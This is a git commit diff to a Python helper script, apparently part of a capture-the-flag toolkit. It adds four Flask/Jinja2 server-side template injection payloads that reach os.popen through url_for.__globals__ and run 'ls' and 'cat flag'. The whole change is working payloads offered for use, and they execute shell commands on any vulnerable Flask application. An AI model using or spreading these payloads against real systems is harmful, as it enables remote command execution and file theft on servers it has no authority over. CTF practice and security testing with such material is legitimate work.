9890f7d9bd3412c1c81ef3d5e1a5bcf6a92170f0
tristandostaler <tristandostaler11@hotmail.com>
2019-02-09 22:21:06 -0500

    Added more SSTI examples for flask

--- Tools/SSTI.py
+++ Tools/SSTI.py
@@ -1,3 +1,7 @@
 def print_flask_payloads():
     print("https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti")
     print("{{config}}")
+    print("{{url_for.__globals__.os.__dict__.popen('ls').read()}}")
+    print("{{url_for.__globals__.os.__dict__.popen('cat flag').read()}}")
+    print("{{url_for.__globals__['os'].__dict__['popen']('ls').read() }}")
+    print("{{url_for.__globals__['os'].__dict__['popen']('cat flag').read() }}")
